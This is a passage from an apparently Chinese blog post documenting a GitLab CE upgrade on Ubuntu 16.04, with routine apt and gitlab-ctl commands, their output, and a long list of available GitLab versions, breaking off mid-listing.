<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> apt update</span></span><br><span class="line">Hit:1 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial InRelease</span><br><span class="line">Hit:2 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial-updates InRelease</span><br><span class="line">Hit:3 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial-backports InRelease</span><br><span class="line">Hit:4 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial-security InRelease</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree</span><br><span class="line">Reading state information... Done</span><br><span class="line">All packages are up to date.</span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改一下gitlab-ce源，升级的时候ubunut已经修改过来并注释了，我们只需把注释去掉</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> vim /etc/apt/sources.list.d/gitlab-ce.list </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 把注释去掉</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看gitlab版本</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-rake gitlab:env:info</span></span><br><span class="line"></span><br><span class="line">System information</span><br><span class="line">System:         Ubuntu 16.04</span><br><span class="line">Current User:   git</span><br><span class="line">Using RVM:      no</span><br><span class="line">Ruby Version:   2.3.6p384</span><br><span class="line">Gem Version:    2.6.13</span><br><span class="line">Bundler Version:1.13.7</span><br><span class="line">Rake Version:   12.3.0</span><br><span class="line">Redis Version:  3.2.11</span><br><span class="line">Git Version:    2.14.3</span><br><span class="line">Sidekiq Version:5.0.5</span><br><span class="line">Go Version:     unknown</span><br><span class="line"></span><br><span class="line">GitLab information</span><br><span class="line">Version:        10.5.5</span><br><span class="line">Revision:       c7e4919</span><br><span class="line">Directory:      /opt/gitlab/embedded/service/gitlab-rails</span><br><span class="line">DB Adapter:     postgresql</span><br><span class="line">Using LDAP:     no</span><br><span class="line">Using Omniauth: no</span><br><span class="line"></span><br><span class="line">GitLab Shell</span><br><span class="line">Version:        6.0.3</span><br><span class="line">Repository storage paths:</span><br><span class="line">- default:      /var/opt/gitlab/git-data/repositories</span><br><span class="line">Hooks:          /opt/gitlab/embedded/service/gitlab-shell/hooks</span><br><span class="line">Git:            /opt/gitlab/embedded/bin/git</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动gitlab</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl start</span></span><br><span class="line">fail: gitaly: runsv not running</span><br><span class="line">fail: gitlab-monitor: runsv not running</span><br><span class="line">fail: gitlab-workhorse: runsv not running</span><br><span class="line">fail: logrotate: runsv not running</span><br><span class="line">fail: nginx: runsv not running</span><br><span class="line">fail: node-exporter: runsv not running</span><br><span class="line">fail: postgres-exporter: runsv not running</span><br><span class="line">fail: postgresql: runsv not running</span><br><span class="line">fail: prometheus: runsv not running</span><br><span class="line">fail: redis: runsv not running</span><br><span class="line">fail: redis-exporter: runsv not running</span><br><span class="line">fail: sidekiq: runsv not running</span><br><span class="line">fail: unicorn: runsv not running</span><br><span class="line"><span class="meta">#</span><span class="bash"> 服务都没有在跑，需要重新配置一下。</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl reconfigure</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl start</span></span><br><span class="line">ok: run: gitlab-monitor: (pid 2991) 0s</span><br><span class="line">ok: run: gitlab-workhorse: (pid 3004) 1s</span><br><span class="line">ok: run: logrotate: (pid 3019) 0s</span><br><span class="line">ok: run: nginx: (pid 3027) 0s</span><br><span class="line">ok: run: node-exporter: (pid 3033) 1s</span><br><span class="line">ok: run: postgres-exporter: (pid 3045) 0s</span><br><span class="line">ok: run: postgresql: (pid 3127) 1s</span><br><span class="line">ok: run: prometheus: (pid 3134) 0s</span><br><span class="line">ok: run: redis: (pid 3138) 0s</span><br><span class="line">ok: run: redis-exporter: (pid 3142) 1s</span><br><span class="line">ok: run: sidekiq: (pid 3147) 0s</span><br><span class="line">ok: run: unicorn: (pid 3162) 0s</span><br><span class="line">ok: run: sidekiq: (pid 3189) 0s</span><br></pre></td></tr></table></figure>
<p><strong>访问 gitlab 正常，接下来就可以准备升级Gitlab。</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> apt list --upgradable</span></span><br><span class="line">Listing... Done</span><br><span class="line"><span class="meta">#</span><span class="bash"> 注意：这里显示可以升级到13.12.15，但不能直接用 ‘apt upgrade’ 更新</span></span><br><span class="line">gitlab-ce/xenial 13.12.15-ce.0 amd64 [upgradable from: 10.5.5-ce.0]</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> apt list --upgradable -a <span class="comment"># 查看所有的版本</span></span></span><br><span class="line">Listing... Done</span><br><span class="line">gitlab-ce/xenial 13.12.15-ce.0 amd64 [upgradable from: 10.5.5-ce.0]</span><br><span class="line">gitlab-ce/xenial 13.12.12-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.12.11-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.12.10-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.12.9-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.12.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.12.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.12.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.12.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.12.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.12.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.12.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.12.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.12.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.11.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.11.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.11.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.11.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.11.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.11.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.11.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.11.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.10.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.10.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.10.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.10.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.10.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.10.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.9.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.9.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.9.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.9.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.9.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.9.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.9.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.9.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.8.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.8.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.8.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.8.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.8.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.8.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.8.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.8.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.8.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.7.9-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.7.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.7.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.7.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.7.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.7.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.7.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.7.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.7.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.7.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.6.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.6.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.6.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.6.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.6.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.6.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.6.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.6.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.5.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.5.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.5.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.5.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.5.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.5.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.5.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.5.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.4.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.4.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.4.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.4.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.4.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.4.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.4.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.4.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.3.9-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.3.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.3.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.3.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.3.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.3.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.3.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.3.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.3.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.3.0-ce.1 amd64</span><br><span class="line">gitlab-ce/xenial 13.2.10-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.2.9-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.2.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.2.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.2.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.2.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.2.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.2.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.2.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.2.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.2.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.1.11-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.1.10-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.1.9-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.1.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.1.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.1.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.1.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.1.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.1.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.1.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.1.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.1.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.0.14-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.0.13-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.0.12-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.0.10-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.0.9-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.0.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.0.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.0.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.0.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.0.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.0.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.0.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 13.0.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.10.14-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.10.13-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.10.12-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.10.11-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.10.10-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.10.9-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.10.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.10.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.10.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.10.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.10.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.10.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.10.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.10.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.9.10-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.9.9-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.9.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.9.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.9.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.9.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.9.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.9.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.9.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.9.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.8.10-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.8.9-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.8.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.8.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.8.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.8.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.8.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.8.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.8.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.7.9-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.7.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.7.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.7.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.7.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.7.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.7.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.7.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.6.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.6.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.6.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.6.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.6.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.6.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.6.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.6.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.5.10-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.5.9-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.5.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.5.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.5.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.5.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.5.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.5.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.5.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.5.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.4.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.4.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.4.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.4.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.4.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.4.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.4.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.4.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.4.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.3.9-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.3.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.3.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.3.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.3.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.3.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.3.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.3.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.3.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.3.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.2.12-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.2.9-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.2.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.2.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.2.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.2.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.2.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.2.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.2.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.2.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.1.17-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.1.14-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.1.13-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.1.12-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.1.11-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.1.9-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.1.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.1.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.1.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.1.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.1.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.1.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.1.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.0.12-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.0.9-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.0.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.0.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.0.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.0.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.0.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.0.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 12.0.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.11.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.11.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.11.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.11.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.11.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.11.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.11.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.11.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.10.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.10.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.10.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.10.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.10.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.10.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.10.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.10.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.10.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.9.12-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.9.11-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.9.10-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.9.9-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.9.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.9.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.9.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.9.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.9.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.9.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.8.10-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.8.9-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.8.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.8.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.8.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.8.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.8.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.8.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.8.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.7.12-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.7.11-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.7.10-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.7.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.7.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.7.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.7.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.7.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.7.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.6.11-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.6.10-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.6.9-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.6.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.6.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.6.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.6.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.6.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.6.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.6.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.5.11-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.5.10-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.5.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.5.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.5.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.5.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.5.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.5.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.5.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.5.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.4.14-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.4.13-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.4.12-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.4.11-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.4.10-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.4.9-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.4.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.4.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.4.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.4.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.4.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.4.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.4.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.3.14-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.3.13-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.3.12-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.3.11-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.3.10-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.3.9-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.3.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.3.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.3.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.3.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.3.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.3.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.3.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.2.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.2.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.2.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.2.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.2.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.2.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.2.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.2.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.1.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.1.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.1.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.1.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.1.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.1.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.1.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.0.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.0.5-ce.0 amd64</span><br><span 